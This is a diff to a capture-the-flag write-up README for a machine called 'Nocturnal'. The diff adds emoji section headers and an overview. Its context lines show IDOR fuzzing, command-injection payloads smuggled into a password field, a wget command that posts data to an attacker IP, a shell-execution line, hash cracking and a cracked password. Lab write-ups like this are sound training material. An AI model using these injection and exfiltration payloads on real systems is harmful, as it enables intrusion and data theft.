@@ -1,4 +1,12 @@
-# Nocturnal
+# 🌙 Nocturnal
+
+## 📝 Overview
+
+The machine involves exploiting an IDOR (Insecure Direct Object Reference) to access user files, 
+leveraging a vulnerable admin panel to download sensitive database files, 
+cracking password hashes, and escalating privileges via an outdated ISPConfig installation.
+
+## 🔍 Enumeration
 
 Start with **Nmap** to identify open ports and services:
 ```sh
@@ -14,6 +22,8 @@ File upload restrictions:
 ```
 Invalid file type." PDF, doc, docx, xls, xlsx, and odt are allowed
 ```
+
+## 🕵️‍♂️ IDOR / Fuzzing
 
 IDOR / Fuzzing: Fuzz usernames to find valid accounts:
 ```sh
@@ -34,6 +44,8 @@ password=1%0awhoami>text.txt%0a&backup=
 password=''>/dev/null%0als%09/var/www/nocturnal_database&backup=
 ```
 
+## 🛡️ Admin Panel Analysis
+
 Admin.php sanitization function:
 ```php
 function cleanEntry($entry) {
@@ -50,7 +62,7 @@ password=''>/dev/null%0awget%09-X%09POST%09http://10.10.14.124:8000/upload%09-F%
 # password=test%0abash%09/tmp/shell&backup=
 ```
 
-
+## 🔑 Extracting Passwords
 
 Extracted hashes from the database:
 ```sh
@@ -62,6 +74,7 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # slowmotionapocalypse
 ```
 
+## 🖥️ SSH Access
 
 SSH into the machine with tobias:
 ```sh
@@ -77,6 +90,8 @@ Found service running on port 8080:
 ```sh
 ss -tulpn
 ```
+
+## 🧗 Privilege Escalation via ISPConfig
 
 Tunneling via SSH to access ISPConfig:
 ```sh
